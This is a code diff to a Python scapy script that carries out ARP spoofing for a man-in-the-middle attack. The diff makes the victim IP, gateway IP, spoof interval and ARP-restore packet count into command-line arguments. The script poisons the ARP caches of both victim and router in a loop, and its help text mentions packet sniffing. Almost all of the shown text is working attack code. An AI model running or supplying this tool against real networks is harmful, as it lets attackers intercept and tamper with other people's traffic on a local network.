@@ -5,11 +5,18 @@ from scapy.all import ARP, send, sniff, conf
 import time
 import sys
 import os
+import argparse
 from threading import Thread
 
-# CONFIG
-target_ip = "192.168.1.10"   # Victim
-gateway_ip = "192.168.1.1"   # Router
+parser = argparse.ArgumentParser(description="MITM simulation — ARP spoof + packet sniffing")
+parser.add_argument("--target", default="192.168.1.10", help="Victim IP (default: 192.168.1.10)")
+parser.add_argument("--gateway", default="192.168.1.1", help="Router IP (default: 192.168.1.1)")
+parser.add_argument("--interval", type=float, default=2.0, help="Spoof interval in seconds (default: 2)")
+parser.add_argument("--restore-count", type=int, default=5, help="Packets to send when restoring ARP (default: 5)")
+args = parser.parse_args()
+
+target_ip = args.target
+gateway_ip = args.gateway
 iface = conf.iface
 
 # Utils
@@ -28,7 +35,7 @@ def spoof(target, spoof_ip):
 def restore(target, target_mac, source_ip, source_mac):
     packet = ARP(op=2, pdst=target, hwdst=target_mac,
                  psrc=source_ip, hwsrc=source_mac)
-    send(packet, count=5, verbose=False)
+    send(packet, count=args.restore_count, verbose=False)
 
 # MITM logic
 def mitm():
@@ -37,7 +44,7 @@ def mitm():
         while True:
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
-            time.sleep(2)
+            time.sleep(args.interval)
     except KeyboardInterrupt:
         print("\n[!] Stopping MITM attack...")
         restore(target_ip, get_mac(target_ip), gateway_ip, get_mac(gateway_ip))
